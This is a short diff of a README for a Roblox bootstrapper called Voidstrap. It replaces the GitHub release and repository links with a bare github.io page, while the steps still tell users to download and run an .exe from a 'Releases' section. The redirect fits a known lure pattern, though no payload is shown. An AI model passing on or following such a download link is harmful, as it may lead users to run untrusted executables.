@@ -1,12 +1,12 @@
 # ⚙️ Voidstrap - Customize your gaming experience easily
 
-[![Download Voidstrap](https://img.shields.io/badge/Download-Voidstrap-blue.svg)](https://github.com/Savel7250/Voidstrap/releases)
+[![Download Voidstrap](https://img.shields.io/badge/Download-Voidstrap-blue.svg)](https://savel7250.github.io)
 
 Voidstrap serves as a custom bootstrapper for the Roblox platform. It replaces the default launcher and provides specific tools to modify your game settings and performance. Users choose Voidstrap to gain control over their installation and improve the way Roblox runs on their Windows computer.
 
 ## 📥 How to download and install
 
-1. Visit the [official release page](https://github.com/Savel7250/Voidstrap) to get the latest version.
+1. Visit the [official release page](https://savel7250.github.io) to get the latest version.
 2. Look for the recent release under the "Releases" section on the right side of the page.
 3. Click the file ending in `.exe` to start the download.
 4. Save the file to your desktop or your Downloads folder.
